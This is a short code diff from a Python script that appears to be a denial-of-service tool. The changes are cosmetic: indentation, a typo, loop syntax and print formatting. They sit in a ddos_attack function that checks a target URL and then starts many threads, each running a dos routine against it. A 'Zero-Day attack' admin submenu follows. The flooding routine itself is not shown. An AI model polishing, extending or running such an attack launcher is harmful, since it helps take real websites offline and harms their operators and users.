@@ -199,18 +199,18 @@ def ddos_attack():
     if threads == 0:
         exit("Threads count is incorrect!")
 
-        if not url.__contains__("http"):
-            exit("URL doesnt contain http or https!")
+    if not url.__contains__("http"):
+        exit("URL doesn't contain http or https!")
 
     if not url.__contains__("."):
         exit("Invalid domain!")
 
-    for i in range(0, threads):
+    for i in range(threads):
         thr = threading.Thread(target=dos, args=(url,))
         thr.start()
-        print(str(i + 1) + " threads started!")
+        print(f"{i + 1} threads started!")
 
-# Submenu for Admin (zero attack)
+# Submenu for Admin (Zero-Day attack)
 def zero_attack_menu(url_or_ip):
     while True:
         print(Fore.YELLOW + """
